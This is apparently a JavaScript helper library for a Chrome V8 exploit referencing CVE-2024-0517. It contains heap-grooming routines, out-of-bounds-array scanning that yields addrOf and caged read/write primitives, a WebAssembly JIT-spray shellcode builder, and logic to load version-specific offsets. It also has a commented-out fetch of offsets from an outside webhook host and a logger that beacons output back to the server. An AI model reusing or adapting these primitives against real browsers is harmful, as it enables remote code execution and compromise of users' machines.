const conid = Math.floor(Math.random() * 1000000);
const _consolelog = console.log;
console.log = async (...msg) => {
    _consolelog(...msg);
    try { eval(`%DebugPrint(\`${msg.join(' ')}\`);`); } catch(e) {}
    if (typeof document !== 'undefined') {
        let d = document.getElementById('log');
        if (d) {
            d.innerText += msg.join(' ') + '\n';
        }
    }
    if (window.location.search.indexOf(`nolog`) == -1) {
        try {
            let m = encodeURIComponent(`id[${conid}]: ${msg.join(' ')}`);
            // return await fetch(`/?msg=${m}`).catch(() => {});
            let i = document.createElement('img');
            return await new Promise(r => {
                i.onload = i.onerror = r;
                i.src = `/?msg=${m}`;
                document.body.appendChild(i);
            });
        }
        catch(e) {
            return;
        }
    }
}

// # Utility functions

function init(offsets, version_hint) {
    let target_version = version_hint || (typeof navigator != 'undefined' ? navigator.userAgent.match(/Chrome.([^ ]+)/)?.[1] : null) || (typeof version != 'undefined' ? version() : '');
    let resulting_offsets = { ...offsets, version: target_version };
    let version_offsets = {...offsets};
    for (let x of target_version.toString().split(".")) {
        version_offsets = version_offsets[x] || {};
        for (let key of Object.keys(version_offsets)) {
            resulting_offsets[key] = version_offsets[key];
        }
    }

    // Check for updated version offsets
    let exploit = window.location.href.match(/.*(CVE-[0-9-]+)?/i)?.[0];
    // fetch(`https://offsets.webhooks.pw/exploit/chrome/CVE-2024-0517/offsets.json?version=${version_hint}&exploit=${exploit}`)
    // .then((response) => { if (ok) return response.json(); return {}; })
    // .then((data) => {
    //     for (let key of Object.keys(data)) {
    //         version_offsets[key] = data[key];
    //     }
    // });
    return resulting_offsets;
}

let references = [];
let arr_buf = new ArrayBuffer(8);
let f64_arr = new Float64Array(arr_buf);
let b64_arr = new BigInt64Array(arr_buf);

function ftoi(f) {
    f64_arr[0] = f;
    return b64_arr[0];
}

function itof(i) {
    b64_arr[0] = i;
    return f64_arr[0];
}

function to_hex(val, width = 16) {
    let _v = typeof val == 'bigint' ? val : (Number.isSafeInteger(val) ? BigInt(val) : ftoi(val));
    _v = _v >= 0 ? _v : 0x10000000000000000n + _v;
    return '0x' + _v.toString(16).padStart(width, '0');
}

function hold_reference(obj) {
    references.push(obj);
}

function mark_sweep_gc() {
    new ArrayBuffer(0x7fe00000);
}

function scavenge_gc() {
    for (let i = 0; i < 8; i++) {
        // fill up new space external backing store bytes
        hold_reference(new ArrayBuffer(0x200000));
    }
    hold_reference(new ArrayBuffer(8));
}

function clean_gc() {
    scavenge_gc();
    scavenge_gc();
    mark_sweep_gc();
    mark_sweep_gc();
}

function noOpt(func) {
    let counter = 0;
    const wrapper = (...args) => {
        // Function stub to prevent JIT optimization
        counter += 1;
        if (counter % 7 == 1) {
            wrapper.stub = eval(func.toString() + `// ${counter}`);
        }
        
        return wrapper.stub(...args);
    };
    return wrapper;
}

function generate(builder, vals, mark = 0xccccccccccccccccn) {
    builder.addFunction("shellcode", makeSig([kWasmI64], [kWasmI64])).exportFunc().addBody([
        kExprI64Const, ...wasmSignedLeb64((mark & 0x8000000000000000n) > 0n ? mark - 0x10000000000000000n : mark),
        kExprLocalGet, 0,
        kExprI64Shl,
  
        ...vals.flatMap(v => {
          return [
            kExprI64Const, ...wasmSignedLeb64((v & 0x8000000000000000n) > 0n ? v - 0x10000000000000000n : v),
            kExprI64Xor,
          ];
        }),
  
        kExprI64Const, 1,
        kExprI64Ior,
    ]);
    return builder;
}

function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}

function cleanShellcodeOutput(data) {
    // Can be called with a string, array or a TypedArray
    function cleanRec(e) {
        if (e.length === 0) return [];
       
        let nullCount = (e.match(/\0/g) || []).length;
        // If there are no null bytes, return the string
        if (nullCount === 0) return [e];
        // If it's a wide char string, return the string without null bytes
        if (nullCount == (e.length - 1) / 2) return [e.replace(/\0/g, '')];

        // If there are null bytes, split the string and clean each part
        let sep = e.indexOf('\0\0') !== -1 ? '\0\0' : '\0';
        let part1 = e.split(sep, 1)[0];
        let part2 = e.slice(part1.length + sep.length);
        return [...cleanRec(part1), ...cleanRec(part2)];
    }

    if (data instanceof Object.getPrototypeOf(Uint8Array)) {
        data = Array.from(new Uint8Array(data.buffer)).map(x => String.fromCharCode(x)).join('');
    }
    else if (Array.isArray(data)) {
        data = data.map(x => String.fromCharCode(x)).join('');
    }
    return cleanRec(data.replace(/\0+$/, ''));
}

// TODO: Remove this
function scan_obj_primitives(oob_arr, obj_arr) {
    // Create an addrOf primitive, by scanning through an OOB buffer for the obj_arr array,
    // searching for the object reference in the array. When a reference candidate is found,
    // return a function that can be used to leak the object address
    obj_arr[0] = obj_arr[1] = obj_arr[2] = obj_arr[3] = obj_arr[4] = obj_arr[5] = {};

    let last = null;
    for (let x = 0; x < oob_arr.length; x++) {
        if (oob_arr[x] == last) {
            let val = oob_arr[x-1];
            obj_arr[0] = obj_arr[1] = {};
            if (oob_arr[x-1] != val) {
                return {
                    addrOf: (obj) => {
                        obj_arr[2] = obj_arr[3] = obj;
                        return ftoi(oob_arr[x]) & 0xffffffffn;
                    }
                };
            }

            obj_arr[0] = obj_arr[1] = obj_arr[2];
        }
        last = oob_arr[x];
    }

    throw 'addrOf primitive not found';
}

// TODO: Remove this
function scan_crw_primitives(oob_arr, crw_arr) {
    // Create cagedRead/Write primitives, by scaning through an OOB buffer for the 
    // crw_arr array, searching for the array length in both high and low dwords. 
    // When a length candidate is found, cange the crw_arr length and recheck the
    // candidate to confirm
    for (let x = 0; x < oob_arr.length; x++) {
        let value = ftoi(oob_arr[x]);
        // Check both the high and low dwords
        for (let shift of [0n, 32n]) {
            if (((value >> shift) & 0xffffffffn) == BigInt(crw_arr.length << 1)) {
                // Increase the length and read candidate again
                crw_arr.push(1.1);
                if (((ftoi(oob_arr[x]) >> shift) & 0xffffffffn) == BigInt(crw_arr.length << 1)) {
                    let elements_index = shift ? x : x - 1;
                    let elements_shift = shift ? 0n : 32n;

                    // Prevent optimization of the read/write functions
                    let _cagedRead = noOpt((addr, oob_arr, crw_arr, elements_index, elements_shift) => {
                            let old = oob_arr[elements_index];
                            
                            oob_arr[elements_index] = itof(
                                ((addr - 8n) << elements_shift) | 
                                (ftoi(old) & (elements_shift ? 0x00000000ffffffffn : 0xffffffff00000000n))
                            );
    
                            let result = ftoi(crw_arr[0]);
                            oob_arr[elements_index] = old;
                            return result;
                    });
                    return {
                        elements_index,
                        elements_shift,
                        cagedRead: (addr) => {
                            return _cagedRead(addr, oob_arr, crw_arr, elements_index, elements_shift);
                        },
                        cagedWrite: (addr, value) => {
                            let old = oob_arr[elements_index];
                            
                            oob_arr[elements_index] = itof(
                                ((addr - 8n) << elements_shift) | 
                                (ftoi(old) & (elements_shift ? 0x00000000ffffffffn : 0xffffffff00000000n))
                            );
    
                            crw_arr[0] = itof(value);
                            oob_arr[elements_index] = old;
                        }
                    };
                }
            }
        }
    }
    throw 'Caged Read / Write primitives not found';
}

function scan_primitives(oobarr, objarr, crwarr, oobarr_length = 3) {
    // Address of the oobarr is calculated by reading the elements ptr from the array 
    // and adding the length of the FixedArray header + the size of the elements array
    // Note: This assumes the original length of oobarr is `oobarr_length` and it's 
    // type was PACKED_DOUBLE_ARRAY
    let oobelements_addr = ftoi(oobarr[oobarr_length + 1]) & 0xffffffffn;
    let oobaddr = oobelements_addr + (BigInt(oobarr_length + 1) * 8n);

    // Create an addrOf primitive, by scanning through an OOB buffer for the obj_arr array,
    // searching for the object reference in the array.     
    let objelements_index;
    objarr.fill({});
    for (let x = 0; x < oobarr.length; x++) {
        // Check if two consecutive elements in the oobarr are the same
        if (oobarr[x] == oobarr[x + 1]) {
            // Modify the objarr values, if the saved value and the read value now differ the array has been found
            let val = oobarr[x];
            objarr[0] = objarr[1] = {};
            if (oobarr[x] != val) {
                objelements_index = x;
                break;
            }

            // Reset the objarr values
            objarr[0] = objarr[1] = oobarr[2];
        }
    }
    if (objelements_index === undefined) {
        throw 'objelements_index not found';
    }

    let _addrOf = noOpt((obj, oobarr, objarr, objelements_index) => {
        objarr[0] = obj;
        return ftoi(oobarr[objelements_index]) & 0xffffffffn;
    });
    let addrOf = (obj) => {
        return _addrOf(obj, oobarr, objarr, objelements_index);
    }
    if (addrOf(oobarr) != oobaddr) {
        throw 'Incorrect addrOf primitive identified';
    }

    // Create the cagedRead & cagedWrite primitives
    let crwaddr = addrOf(crwarr);
    let crwelements_index = Math.floor(Number((crwaddr - oobelements_addr)) / 8);
    let crwelements_shift = Number.isInteger(Number((crwaddr - oobelements_addr)) / 8) ? 0n : 32n;

    // Ensure that the cagedRead/cagedWrite primitives are noOpted
    let _cagedRead = noOpt((addr, oobarr, crwarr, crwelements_index, crwelements_shift) => {
        let old = oobarr[crwelements_index];
        let repl = (ftoi(old) & (0xffffffff00000000n >> crwelements_shift)) | (((addr - 8n) | 1n) << crwelements_shift);

        oobarr[crwelements_index] = itof(repl);
        let val = ftoi(crwarr[0]);
        oobarr[crwelements_index] = old;
        return val;
    });
    let _cagedWrite = noOpt((addr, value, oobarr, crwarr, crwelements_index, crwelements_shift) => {
        let old = oobarr[crwelements_index];
        let repl = (ftoi(old) & (0xffffffff00000000n >> crwelements_shift)) | (((addr - 8n) | 1n) << crwelements_shift);

        oobarr[crwelements_index] = itof(repl);
        crwarr[0] = itof(value);
        oobarr[crwelements_index] = old;
    });

    let cagedRead = (addr) => {
        return _cagedRead(addr, oobarr, crwarr, crwelements_index, crwelements_shift);
    }
    let cagedRead32 = (addr) => {
        return _cagedRead(addr, oobarr, crwarr, crwelements_index, crwelements_shift) & 0xffffffffn;
    }
    let cagedWrite = (addr, value) => {
        return _cagedWrite(addr, value, oobarr, crwarr, crwelements_index, crwelements_shift);
    }
    let cagedWrite32 = (addr, value) => {
        let _value = (cagedRead(addr) & 0xffffffff00000000n) | BigInt(value);
        return _cagedWrite(addr, _value, oobarr, crwarr, crwelements_index, crwelements_shift);
    }

    // Test the cagedRead and cagedWrite primitives
    if (itof(cagedRead(oobelements_addr + 8n)) != oobarr[0]) {
        throw 'Incorrect cagedRead primitive identified';
    }
    cagedWrite(oobelements_addr + 8n, ftoi(7.7));
    if (oobarr[0] != 7.7) {
        throw 'Incorrect cagedWrite primitive identified ' + oobarr[0];
    }

    return {addrOf, cagedRead32, cagedRead, cagedWrite32, cagedWrite};
}

// TODO: Still needs some work
class OobarrAccessor {
    SCAN_SIZE = 0x40; // Size of the scan buffer

    constructor(oobarr, objarr, crwarr) {
        this.oobarr = oobarr;
        this.objarr = objarr;
        this.crwarr = crwarr;

        this.objarr0index = -1;
        this.crwElementsIndex = 49;
        this.objElementsAddr;
        this.oobElementsAddr;
    }

    copy(length) {
        let newarr = new Array(length);
        for (let i = 0; i < length; i++) {
            newarr[i] = this.get(i);
        }
        return newarr;
    }

    get(index) {
        let v = ftoi(this.oobarr[index >> 1]);
        return index % 2 == 0 ? v & 0xffffffffn : v >> 32n;
    }

    set(index, value) {
        let v = ftoi(this.oobarr[index >> 1]);
        if (index % 2 == 0) {
            v = (v & 0xffffffff00000000n) | BigInt(value);
        } else {
            v = (v & 0x00000000ffffffffn) | (BigInt(value) << 32n);
        }
        this.oobarr[index >> 1] = itof(v);
    }

    find(needle, mask) {
        for (let i = 0; i < this.SCAN_SIZE; i++) {
            let found = true;
            for (let j = 0; j < needle.length; j++) {
                if ((this.get(i + j) & mask[j]) != (needle[j] & mask[j])) {
                    found = false; 
                    break;
                }
            }
            if (found) {
                return i;
            }
        }
        return -1;
    }

    factory() {
        let check = this.copy(this.SCAN_SIZE);
        this.objarr.fill({});
        for (let i = 0; i < check.length; i++) {
            if (this.get(i) != check[i]) {
                if (this.get(i) == this.get(i + 1)) {
                    this.objarr0index = i;
                    break;
                }
            }
        }
        // log(`objarr0index: ${this.objarr0index}`);
        if (this.objarr0index == -1) {
            throw 'objarr0index not found';
        }

        // let index = this.find([this.addrOf(this.objarr), 0x0000000cn], [0xfffff000n, 0xffffffffn]);
        // if (index == -1) {
        //     throw 'objarr not found in oobarr';
        // }
        // log(`index: ${index}`);
        // this.objElementsAddr = this.get(this.crwElementsIndex);
        // this.oobElementsAddr = this.objElementsAddr - (BigInt(this.objarr0index) * 4n);

        // let crwarrAddr = this.addrOf(this.crwarr);
        // this.crwElementsIndex = Number(crwarrAddr - this.oobElementsAddr) / 4;
    }

    addrOf(obj) {
        this.objarr[0] = obj;
        return this.get(this.objarr0index);
    }

    read32(addr) {
        return this.read(addr) & 0xffffffffn;
    }

    read(addr) {
        let old = this.get(this.crwElementsIndex);
        this.set(this.crwElementsIndex, (addr - 8n) | 1n);
        
        let val = ftoi(this.crwarr[0]);
        this.set(this.crwElementsIndex, old);

        return val;
    }

    write32(addr, value) {
        let old = this.get(this.crwElementsIndex);
        this.set(this.crwElementsIndex, (addr - 8n) | 1n);

        let v = ftoi(this.crwarr[0]);
        v = (v & 0xffffffff00000000n) | (value & 0xffffffffn);
        this.crwarr[0] = itof(v);
        this.set(this.crwElementsIndex, old);
    }

    write(addr, value) {
        let old = this.get(this.crwElementsIndex);
        this.set(this.crwElementsIndex, (addr - 8n) | 1n);

        this.crwarr[0] = itof(value);
        this.set(this.crwElementsIndex, old);
    }

}
